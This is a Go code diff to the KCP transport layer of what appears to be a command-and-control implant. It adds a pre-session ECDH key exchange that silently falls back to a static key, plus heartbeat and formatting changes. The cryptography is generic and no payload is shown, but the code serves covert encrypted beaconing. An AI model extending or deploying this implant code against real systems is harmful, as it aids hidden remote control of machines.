@@ -3,10 +3,11 @@
 package main
 
 import (
+	"encoding/binary"
 	"fmt"
 	"implant/core/app"
-	"implant/core/debuglog"
 	"implant/core/communication"
+	"implant/core/debuglog"
 	"implant/core/encrypt"
 	"implant/core/reconnect"
 	"implant/core/utils"
@@ -16,7 +17,6 @@ import (
 	"github.com/xtaci/kcp-go/v5"
 )
 
-
 // KCPClient 实现 communication.Transport（KCP 持久传输）。
 type KCPClient struct {
 	Client       *kcp.UDPSession
@@ -24,7 +24,7 @@ type KCPClient struct {
 	connectStart time.Time
 	connected    bool
 	stopCh       chan struct{} // 心跳 goroutine 退出信号
-	sendMutex    sync.Mutex   // 串行化所有写路径（心跳/结果/FirstBlood），防帧交错
+	sendMutex    sync.Mutex    // 串行化所有写路径（心跳/结果/FirstBlood），防帧交错
 }
 
 // NewTransport 构造 KCP 传输（单二进制 build tag 入口）
@@ -69,6 +69,43 @@ func (s *KCPClient) closeClientLocked() {
 		s.Client.Close()
 		s.Client = nil
 	}
+}
+
+// kxHandshake 会话前密钥交换（与 tcp 同协议，见 transport_tcp.go 的说明）。
+// 失败一律静默继续走静态密钥，不返回错误 —— 交换失败应与"服务端不支持 ECDH"同表现。
+func (s *KCPClient) kxHandshake() {
+	kx, err := encrypt.NewKeyExchange()
+	if err != nil {
+		return
+	}
+	if err := s.rawSend(utils.BytesCombine(utils.WriteInt(kxMsgType), []byte(kx.HeaderValue()))); err != nil {
+		return
+	}
+	total, err := communication.ReadFramedLength(s.Client)
+	if err != nil || total < 8 {
+		return
+	}
+	payload, err := communication.ReadFramedPayload(s.Client, total)
+	if err != nil || len(payload) < 4 {
+		return
+	}
+	if int(binary.BigEndian.Uint32(payload[:4])) != kxMsgType {
+		return
+	}
+	peerPub, err := encrypt.ParsePeerPublicKey(string(payload[4:]))
+	if err != nil {
+		return
+	}
+	salt, _ := app.GetListenerKeyConfig(listenerType)
+	masterKey, err := kx.DeriveMasterKey(peerPub, salt[:16])
+	if err != nil {
+		return
+	}
+	if err := encrypt.GlobalClientKeyManager.ReplaceMasterKey(masterKey); err != nil {
+		return
+	}
+	utils.MetaInfo = nil // 旧 MetaInfo 由静态密钥生成，必须重建
+	debuglog.Printf("🔑 [KCP-KX] 会话前密钥交换完成，已替换静态主密钥\n")
 }
 
 // Connect KCP 拨号 + 优化参数 + FirstBlood + 会话密钥 + 心跳。
@@ -125,7 +162,7 @@ func (s *KCPClient) StartHeartbeat() {
 		close(s.stopCh)
 	}
 	s.stopCh = make(chan struct{})
-stop := s.stopCh
+	stop := s.stopCh
 	go app.HeartbeatLoop(stop, s.keepAlive)
 }
 
